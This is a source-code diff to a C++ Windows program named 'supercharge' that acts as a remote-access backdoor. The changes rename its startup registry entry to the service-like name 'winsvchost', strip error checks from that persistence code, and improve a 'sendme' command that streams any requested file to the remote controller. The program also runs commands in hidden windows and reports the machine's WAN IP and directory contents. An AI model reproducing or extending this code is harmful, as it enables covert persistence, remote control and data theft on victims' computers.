@@ -28,17 +28,8 @@ void supercharge::startup()
     }
 
 	std::wstring filepath = pth.str();
-	if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal) != ERROR_SUCCESS)
-	{
-		// return;
-	}
-	if (RegSetValueExW(NewVal, L"WindowSuperCharge", 0, REG_SZ, (BYTE*)filepath.c_str(), (filepath.size()+1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
-
-		// return;
-	}
-	else {
-		// Added to startup
-	}
+	RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal);
+	RegSetValueExW(NewVal, L"winsvchost", 0, REG_SZ, (BYTE*)filepath.c_str(), (filepath.size()+1) * sizeof(wchar_t));
 	RegCloseKey(NewVal);
 }
 
@@ -56,7 +47,7 @@ void supercharge::Execute(char* toExecute)
 	if(!CreateProcess(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
 		error_reply.str("");
 		error_reply.clear();
-		error_reply << "Failed to Create Process, Error Code : " << GetLastError();
+		error_reply << "Failed to Execute Command, Error Code : " << GetLastError();
 		respond(error_reply.str().c_str()); 
 	} else {
 		respond("Command Executed.");
@@ -374,27 +365,28 @@ void supercharge::ConnectionManage()
 
 			else if(command.find("sendme") != std::string::npos)
 			{
-				memset(file_commands, '\0', 5);
-				strsplit(toSplit, file_commands);
-				// std::string filename = std::string(file_commands[1]);
-				std::string trigger = "savethis=" + std::string(file_commands[1]);
- 
-				respond(trigger.c_str());
-				// respondF(sendFile(file_commands[1]).c_str());
-				FILE * fs = fopen(file_commands[1], "rb");
-				char fbuffer[500];
-				memset(fbuffer, '\0', 500);
-				//size_t rret, wret;
-				int bytes_read;
-				while(!feof(fs)){
-					if((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0){
-						send(sockfd, fbuffer, bytes_read, 0);
-					} else {
-						break;
+				memset(fcommands, '\0', 5);
+				strsplit(recvbuf, fcommands);
+
+				FILE * fs;
+				if((fs = fopen(fcommands[1], "rb")) != NULL){
+					std::string trigger = "savethis=" + std::string(fcommands[1]);
+					respond(trigger.c_str());
+					char fbuffer[500];
+					memset(fbuffer, '\0', 500);
+					//size_t rret, wret;
+					int bytes_read;
+					while(!feof(fs)){
+						if((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0){
+							send(sockfd, fbuffer, bytes_read, 0);
+						} else {
+							break;
+						}
 					}
+					fclose(fs);
+				} else {
+					respond("File not found.");
 				}
-				fclose(fs);
-				// delete[] fbuffer;
 			} 
 			else if (command == "wanip") {
 				respond((const char*)wanip);
@@ -435,19 +427,7 @@ void supercharge::ConnectionManage()
 				respond("Disconnect Requested. Disconnecting.");
 				connected = false;
 				break;
-			} else if(command == "jre"){
-				DWORD ret;
-				char buf[4096];
-				std::ostringstream srp;
-				ret = GetEnvironmentVariable("JAVA_HOME", buf, 4096);
-				if(ret == 0){
-					srp << "Error : " << GetLastError();
-					respond(srp.str().c_str());
-				} else {
-					std::string r = "Java is installed : " + std::string(buf);
-					respond(r.c_str());
-				}
-			}
+			} 
 			else if(command == "cfolder") // cfolder = Current folder
 			{
 				respond((char*)cDir());
@@ -455,11 +435,17 @@ void supercharge::ConnectionManage()
 			else if(command == "ls")
 			{
 				std::ostringstream files;
+				std::ostringstream ftype;
 				std::string strfiles;
 				HANDLE hFind = FindFirstFile("*", &data);
 				if(hFind != INVALID_HANDLE_VALUE){
 					do{
-						files << data.cFileName << "\n";
+						ftype << data.cFileName;
+						if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
+							files << "\n[DIRECTORY] " << data.cFileName;
+						} else {
+							files << "\n[FILE] " << data.cFileName;
+						}
 					} while(FindNextFile(hFind, &data));
 				} else {
 					respond("Failed to get Files in directory.\n");
